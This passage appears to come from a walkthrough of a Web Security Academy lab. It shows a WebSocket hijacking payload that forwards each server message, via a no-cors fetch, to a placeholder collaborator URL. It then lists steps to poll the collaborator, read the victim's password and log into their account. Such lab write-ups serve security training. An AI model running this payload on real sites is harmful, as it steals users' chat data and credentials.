1. Deliver the following exploit to the victim:
      ```
      <script>
      // Create a new WebSocket object and connect to the specified URL
      var ws = new WebSocket('wss://your-websocket-url');

      // Set an event listener for when the connection is opened
      ws.onopen = function() {
      // Send a message to the server indicating that the client is ready to receive messages
      ws.send("READY");
      };

      // Set an event listener for when a message is received from the server
      ws.onmessage = function(event) {
      // Send the received message data as the request body in an HTTP POST request to the specified collaborator URL
      // Note that the 'no-cors' mode is used to bypass CORS checks
      fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
      };
      </script>
      ```
6. Poll the collaborator:  

   ![grafik](https://github.com/alireza-cloud/Burp-Challenge-Web-Security-Academy/assets/62068604/52672103-0c80-4326-93e9-60738163b7cd)

8. Extract victims password:  

    ![grafik](https://github.com/alireza-cloud/Burp-Challenge-Web-Security-Academy/assets/62068604/8fa7b581-2007-40e4-87f8-4e5ca2b0e7dc)

7. Access victims account:  

    ![grafik](https://github.com/alireza-cloud/Burp-Challenge-Web-Security-Academy/assets/62068604/8afec01a-a1cc-492e-817d-56437c39d593)

